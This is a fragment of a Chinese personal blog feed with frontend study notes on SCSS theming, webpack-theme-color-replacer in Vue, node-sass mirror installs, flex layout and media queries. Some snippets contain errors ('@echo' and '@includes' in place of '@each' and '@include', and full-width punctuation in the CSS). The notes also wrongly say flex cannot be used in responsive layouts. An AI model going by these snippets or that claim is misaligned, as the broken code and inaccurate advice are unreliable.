class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sass style</span></span><br><span class="line"><span class="comment">//-------------------------------</span></span><br><span class="line"><span class="variable">$animal-list</span>: puma, sea-slug, egret, salamander;</span><br><span class="line"><span class="keyword">@each</span> <span class="variable">$animal</span> in <span class="variable">$animal-list</span> &#123;</span><br><span class="line">  .#&#123;<span class="variable">$animal</span>&#125;-<span class="attribute">icon</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;/images/#&#123;$animal&#125;.png&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//css style</span></span><br><span class="line"><span class="comment">//-------------------------------</span></span><br><span class="line"><span class="selector-class">.puma-icon</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;/images/puma.png&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.sea-slug-icon</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;/images/sea-slug.png&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.egret-icon</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;/images/egret.png&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.salamander-icon</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;/images/salamander.png&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="主题色"><a href="#主题色" class="headerlink" title="主题色"></a>主题色</h3><blockquote><p>方案一</p></blockquote><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成主题类名</span></span><br><span class="line"><span class="keyword">@mixin</span> theme(<span class="variable">$name</span>, <span class="variable">$color</span>) &#123;</span><br><span class="line">    <span class="selector-class">.theme-</span>#&#123;<span class="variable">$name</span>&#125; &#123;</span><br><span class="line">        <span class="selector-class">.theme-color-</span>#&#123;<span class="variable">$name</span>&#125; &#123;</span><br><span class="line">            <span class="attribute">color</span>: <span class="variable">$color</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="selector-class">.theme-border-color-</span>#&#123;<span class="variable">$name</span>&#125; &#123;</span><br><span class="line">            <span class="attribute">border-color</span>: <span class="variable">$color</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="selector-class">.theme-bgcolor-</span>#&#123;<span class="variable">$name</span>&#125; &#123;</span><br><span class="line">            <span class="attribute">background-color</span>: <span class="variable">$color</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主题色</span></span><br><span class="line"><span class="variable">$theme-list</span>: (</span><br><span class="line">  blue: <span class="variable">$theme-color-blue</span>,</span><br><span class="line">  grey: <span class="variable">$theme-color-grey</span>,</span><br><span class="line">  orange: <span class="variable">$theme-color-orange</span>,</span><br><span class="line">  red: <span class="variable">$theme-color-red</span>,</span><br><span class="line">  green: <span class="variable">$theme-color-green</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环生成不同主题</span></span><br><span class="line"><span class="keyword">@echo</span> <span class="variable">$name</span>, <span class="variable">$color</span> in <span class="variable">$theme-list</span> &#123;</span><br><span class="line">    <span class="keyword">@includes</span> theme(<span class="variable">$name</span>, <span class="variable">$color</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>方案二</p></blockquote><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_base_url</span>: <span class="string">&quot;./&quot;</span>;</span><br><span class="line"><span class="variable">$img_time</span>: <span class="string">&quot;Snipaste_2021-12-07_22-42-45.png&quot;</span>;</span><br><span class="line"><span class="variable">$themes</span>: (</span><br><span class="line">    light: (</span><br><span class="line">        //字体</span><br><span class="line">        base_color: <span class="number">#414141</span>,</span><br><span class="line">        font_color2: white,</span><br><span class="line">        </span><br><span class="line">        //背景</span><br><span class="line">        base_bg_color: <span class="number">#fff</span>,</span><br><span class="line">        background_color2: <span class="number">#f0f2f5</span>,</span><br><span class="line">        background_color3: red,</span><br><span class="line">        background_color4: <span class="number">#2674e7</span>,</span><br><span class="line">        </span><br><span class="line">        //边框</span><br><span class="line">        base_border_color: <span class="number">#3d414a</span>,</span><br><span class="line">        bgurl: <span class="built_in">url</span>(<span class="string">&#x27;./Snipaste_2021-12-07_22-42-45.png&#x27;</span>),</span><br><span class="line"></span><br><span class="line">        icon_time: <span class="built_in">url</span>(<span class="string">&#x27;#&#123;$img_base_url&#125;#&#123;$img_time&#125;&#x27;</span>)</span><br><span class="line">    ),</span><br><span class="line">    </span><br><span class="line">    dark: (</span><br><span class="line">        //字体</span><br><span class="line">        base_color: <span class="number">#a7a7a7</span>,</span><br><span class="line">        font_color2: white,</span><br><span class="line">        </span><br><span class="line">        //背景</span><br><span class="line">        base_bg_color: <span class="number">#1b2531</span>,</span><br><span class="line">        background_color2: <span class="number">#283142</span>,</span><br><span class="line">        background_color3: <span class="number">#1e6ceb</span>,</span><br><span class="line">        background_color4: <span class="number">#323e4e</span>,</span><br><span class="line">    </span><br><span class="line">        //边框</span><br><span class="line">        base_border_color: <span class="number">#3d414a</span>,</span><br><span class="line">        bgurl: <span class="built_in">url</span>(<span class="string">&#x27;./Snipaste_2021-12-07_22-42-45.png&#x27;</span>),</span><br><span class="line">        icon_time: <span class="built_in">url</span>(<span class="string">&#x27;#&#123;$img_base_url&#125;#&#123;$img_time&#125;&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历主题map</span></span><br><span class="line"><span class="keyword">@mixin</span> themeify &#123;</span><br><span class="line">    <span class="keyword">@each</span> <span class="variable">$theme-name</span>, <span class="variable">$theme-map</span> in <span class="variable">$themes</span> &#123;</span><br><span class="line">        <span class="comment">//!global 把局部变量强升为全局变量</span></span><br><span class="line">        <span class="variable">$theme-map</span>: <span class="variable">$theme-map</span> !global;</span><br><span class="line">        <span class="comment">//判断html的data-theme的属性值  #&#123;&#125;是sass的插值表达式</span></span><br><span class="line">        <span class="comment">//&amp; sass嵌套里的父容器标识   @content是混合器插槽，像vue的slot</span></span><br><span class="line">        <span class="selector-attr">[data-theme=<span class="string">&quot;#&#123;$theme-name&#125;&quot;</span>]</span> &amp; &#123;</span><br><span class="line">            <span class="keyword">@content</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个根据Key获取颜色的function</span></span><br><span class="line"><span class="keyword">@function</span> themed(<span class="variable">$key</span>) &#123;</span><br><span class="line">    <span class="keyword">@return</span> map-get(<span class="variable">$theme-map</span>, <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取背景颜色</span></span><br><span class="line"><span class="keyword">@mixin</span> background_<span class="attribute">color</span>(<span class="variable">$color</span>: <span class="string">&quot;base_bg_color&quot;</span>, <span class="variable">$important</span>: false) &#123;</span><br><span class="line">    <span class="keyword">@include</span> themeify &#123;</span><br><span class="line">        <span class="keyword">@if</span> <span class="variable">$important</span> &#123;</span><br><span class="line">            <span class="attribute">background-color</span>: <span class="built_in">themed</span>(<span class="variable">$color</span>) <span class="meta">!important</span>;</span><br><span class="line">        &#125; <span class="keyword">@else</span> &#123;</span><br><span class="line">            <span class="attribute">background-color</span>: <span class="built_in">themed</span>(<span class="variable">$color</span>);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">@content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取字体颜色</span></span><br><span class="line"><span class="keyword">@mixin</span> font_<span class="attribute">color</span>(<span class="variable">$color</span>: <span class="string">&quot;base_color&quot;</span>, <span class="variable">$important</span>: false) &#123;</span><br><span class="line">    <span class="keyword">@include</span> themeify &#123;</span><br><span class="line">        <span class="keyword">@if</span> <span class="variable">$important</span> &#123;</span><br><span class="line">            <span class="attribute">color</span>: <span class="built_in">themed</span>(<span class="variable">$color</span>) <span class="meta">!important</span>;</span><br><span class="line">        &#125; <span class="keyword">@else</span> &#123;</span><br><span class="line">            <span class="attribute">color</span>: <span class="built_in">themed</span>(<span class="variable">$color</span>);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">@content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取边框颜色</span></span><br><span class="line"><span class="keyword">@mixin</span> border_<span class="attribute">color</span>(<span class="variable">$color</span>: <span class="string">&quot;base_border_color&quot;</span>, <span class="variable">$important</span>: false) &#123;</span><br><span class="line">    <span class="keyword">@include</span> themeify &#123;</span><br><span class="line">        <span class="keyword">@if</span> <span class="variable">$important</span> &#123;</span><br><span class="line">            <span class="attribute">border-color</span>: <span class="built_in">themed</span>(<span class="variable">$color</span>) <span class="meta">!important</span>;</span><br><span class="line">        &#125; <span class="keyword">@else</span> &#123;</span><br><span class="line">            <span class="attribute">border-color</span>: <span class="built_in">themed</span>(<span class="variable">$color</span>);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">@content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取背景图</span></span><br><span class="line"><span class="keyword">@mixin</span> bg_image(<span class="variable">$url</span>, <span class="variable">$important</span>: false) &#123;</span><br><span class="line">    <span class="keyword">@include</span> themeify &#123;</span><br><span class="line">        <span class="keyword">@if</span> <span class="variable">$important</span> &#123;</span><br><span class="line">            <span class="attribute">background-image</span>: <span class="built_in">themed</span>(<span class="variable">$url</span>) <span class="meta">!important</span>;</span><br><span class="line">        &#125; <span class="keyword">@else</span> &#123;</span><br><span class="line">            <span class="attribute">background-image</span>: <span class="built_in">themed</span>(<span class="variable">$url</span>);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">@content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// .box2 会替代 %bg-color</span></span><br><span class="line">%bg-<span class="attribute">color</span> &#123;</span><br><span class="line">    <span class="keyword">@include</span> background_<span class="attribute">color</span>()</span><br><span class="line">&#125;</span><br><span class="line">.bd-color &#123;</span><br><span class="line">    <span class="keyword">@include</span> bg_image(<span class="string">&#x27;icon_time&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">.box2 &#123;</span><br><span class="line">    <span class="keyword">@include</span> font_<span class="attribute">color</span>();</span><br><span class="line">    <span class="keyword">@extend</span> %bg-color;</span><br><span class="line">    <span class="keyword">@extend</span> .bd-color;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="selector-class">.common-util</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">18px</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 多次 include 编译会有很多重复的类（不会编译出&quot;,&quot;选择器, 最好使用 @extend）</span></span><br><span class="line">    <span class="keyword">@include</span> font_<span class="attribute">color</span>(<span class="string">&quot;font_color1&quot;</span>);</span><br><span class="line">    <span class="keyword">@include</span> background_<span class="attribute">color</span>(<span class="string">&quot;background_color1&quot;</span>);</span><br><span class="line">    <span class="keyword">@include</span> border_<span class="attribute">color</span>(<span class="string">&quot;border_color1&quot;</span>);</span><br><span class="line">    <span class="comment">// extend</span></span><br><span class="line">    <span class="comment">// @extend .bg-color;</span></span><br><span class="line">    <span class="comment">// @extend .bd-color;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.bg-color</span> &#123;</span><br><span class="line">    <span class="keyword">@include</span> background_<span class="attribute">color</span>(<span class="string">&quot;background_color1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.bd-color</span> &#123;</span><br><span class="line">    <span class="keyword">@include</span> border_<span class="attribute">color</span>(<span class="string">&quot;border_color1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方案三</p><p><code>webpack-theme-color-replacer</code></p><p><a href="https://www.npmjs.com/package/webpack-theme-color-replacer/v/1.2.17">npm</a><br><a href="https://www.cnblogs.com/jiaoshou/p/16178580.html">参考1</a><br><a href="https://blog.csdn.net/pnjtvxcp/article/details/108141255">参考2</a><br><a href="https://www.jianshu.com/p/10a9fe676145">element-ui</a><br><a href="https://blog.csdn.net/qq_39172655/article/details/123006896">ant-design-vue</a></p><blockquote><p>npm i -D webpack-theme-color-replacer</p></blockquote><p><code>vue.config.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">ThemeColorReplacer</span> = <span class="built_in">require</span>(<span class="string">&#x27;webpack-theme-color-replacer&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">configureWebpack</span>: <span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ThemeColorReplacer</span>(&#123;</span><br><span class="line"><span class="comment">// 需要提取到css文件的颜色数组（可以传入多个颜色值），支持rgb和hsl,也就是换肤改变颜色的变量</span></span><br><span class="line"> <span class="attr">matchColors</span>: [<span class="string">&#x27;#9564ca&#x27;</span>],</span><br><span class="line"><span class="comment">//可选.输出css文件名，支持[contenthash]和[hash]</span></span><br><span class="line"><span class="attr">fileName</span>: <span class="string">&#x27;css/theme-colors-[contenthash:8].css&#x27;</span>,</span><br><span class="line"> <span class="comment">// 可选的。将 css 文本注入 js 文件，不再需要下载 `theme-colors-xxx.css`。</span></span><br><span class="line"><span class="attr">injectCss</span>: <span class="literal">true</span>, </span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模板内修改主题</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item item-0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// const client = require(&#x27;webpack-theme-color-replacer/client&#x27;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> client <span class="keyword">from</span> <span class="string">&quot;webpack-theme-color-replacer/client&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">created</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 这里就直接5秒后换色了，模拟了用户点击一次换肤的过程</span></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="title function_">changeThemeColor</span>(<span class="string">&#x27;#69af23&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">5000</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 设置css新值，点击换肤时候会获取到新的颜色值，然后调用这个方法就行了</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">changeThemeColor</span>(<span class="params">newColor</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// newColors必须是个数组形式，数组长度一定要和配置中的matchColors长度一致，否则缺少的颜色就会出现问题</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// sass里的lighten貌似是使用hsl颜色增加亮度。 varyColor.js   里面的lighten、darke其实是将当前颜色与白色进行混合，与element-ui的色系一致。</span></span></span><br><span class="line"><span class="language-javascript">      client.<span class="property">changer</span>.<span class="title function_">changeColor</span>(&#123; <span class="attr">newColors</span>: [<span class="string">&#x27;&#x27;</span>+newColor] &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">&quot;scss&quot;</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 基础色</span><br><span class="line">$color: #9564ca;</span><br><span class="line">.item&#123;</span><br><span class="line">  height: 30px;</span><br><span class="line">  margin-top: 4px;</span><br><span class="line">&#125;</span><br><span class="line">.item-0 &#123;</span><br><span class="line">  background: $color; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="node-sass-安装失败"><a href="#node-sass-安装失败" class="headerlink" title="node-sass 安装失败"></a>node-sass 安装失败</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">npm i node-sass --sass_binary_site=<span class="attr">https</span>:<span class="comment">//npm.taobao.org/mirrors/node-sass/</span></span><br><span class="line"><span class="comment">// 也可以设置系统环境变量的方式。示例</span></span><br><span class="line"><span class="comment">// linux、mac 下</span></span><br><span class="line"><span class="variable constant_">SASS_BINARY_SITE</span>=<span class="attr">https</span>:<span class="comment">//npm.taobao.org/mirrors/node-sass/ npm install node-sass</span></span><br><span class="line"><span class="comment">// window 下</span></span><br><span class="line">set <span class="variable constant_">SASS_BINARY_SITE</span>=<span class="attr">https</span>:<span class="comment">//npm.taobao.org/mirrors/node-sass/ &amp;&amp; npm install node-sass</span></span><br></pre></td></tr></table></figure><p>或者设置全局镜像源：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set sass_binary_site <span class="attr">https</span>:<span class="comment">//npm.taobao.org/mirrors/node-sass/</span></span><br></pre></td></tr></table></figure><p><strong>安装失败后重新安装问题<br>之前安装失败，再安装就不去下载了，怎么办呢？那就先卸载再安装：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall node-sass</span><br><span class="line">npm i node-sass --sass_binary_site=<span class="attr">https</span>:<span class="comment">//npm.taobao.org/mirrors/node-sass/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Scss&quot;&gt;&lt;a href=&quot;#Scss&quot; class=&quot;headerlink&quot; title=&quot;Scss&quot;&gt;&lt;/a&gt;Scss&lt;/h2&gt;&lt;h3 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; class=&quot;headerlink&quot; title=&quot;变量&quot;&gt;&lt;/a&gt;变量&lt;/h</summary>
      
    
    
    
    <category term="css" scheme="https://hisai3.github.io/hisai3.github.io/categories/css/"/>
    
    
    <category term="css" scheme="https://hisai3.github.io/hisai3.github.io/tags/css/"/>
    
    <category term="Scss" scheme="https://hisai3.github.io/hisai3.github.io/tags/Scss/"/>
    
  </entry>
  
  <entry>
    <title>Problem</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/01/14/Problem/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/01/14/Problem/</id>
    <published>2023-01-14T06:31:31.000Z</published>
    <updated>2023-01-15T07:01:15.760Z</updated>
    
    <content type="html"><![CDATA[<h5 id="flex布局"><a href="#flex布局" class="headerlink" title="flex布局"></a>flex布局</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span>123<span class="tag">&lt;/<span class="name">i</span>&gt;</span>电话预定<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最终显示123在上文本在下，可以 display: flex;<br>        flex-direction: column;这就可以让a标签中的文本和img的垂直显示的效果</p><p>原因：<em><strong>在flex布局中，文本也算是子项！！！</strong></em><br>可以把 i 标签改为块级元素，用margin居中</p><h5 id="响应式布局！！的关键：媒体查询（c3支持）响应式布局为了适配pc端和移动端的"><a href="#响应式布局！！的关键：媒体查询（c3支持）响应式布局为了适配pc端和移动端的" class="headerlink" title="响应式布局！！的关键：媒体查询（c3支持）响应式布局为了适配pc端和移动端的?"></a>响应式布局！！的关键：媒体查询（c3支持）响应式布局为了适配pc端和移动端的?</h5><p>在响应式布局中不能使用flex布局<br>能根据屏幕宽度的不同，去加载对应的css代码段</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span>(<span class="attribute">width</span>:<span class="number">800px</span>)&#123;</span><br><span class="line"><span class="comment">/*只有width：800px可以改，其他不变*/</span></span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">        <span class="attribute">background</span>：<span class="selector-id">#000</span>；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span>(<span class="attribute">min-width</span>:<span class="number">800px</span>)&#123;</span><br><span class="line"><span class="comment">/*屏幕宽大于800px时执行*/</span></span><br><span class="line">    <span class="selector-tag">body</span>&#123;</span><br><span class="line">        <span class="attribute">background</span>：<span class="selector-id">#000</span>；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span>(<span class="attribute">min-width</span>:<span class="number">800px</span>) <span class="keyword">and</span> (<span class="attribute">max-width</span>:<span class="number">900px</span>)&#123;</span><br><span class="line"><span class="comment">/*屏幕宽大于800px,小于900px时执行*/</span></span><br><span class="line">    <span class="selector-tag">body</span>&#123;</span><br><span class="line">        <span class="attribute">background</span>：<span class="selector-id">#000</span>；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Array-高阶函数"><a href="#Array-高阶函数" class="headerlink" title="Array 高阶函数"></a>Array 高阶函数</h4><ol><li><p><strong>forEach(遍历)</strong></p><p> forEach() 方法用于调用数组的每个元素，并将元素传递给回调函数。(没有返回值，将数组遍历)</p><p> 注意: forEach() 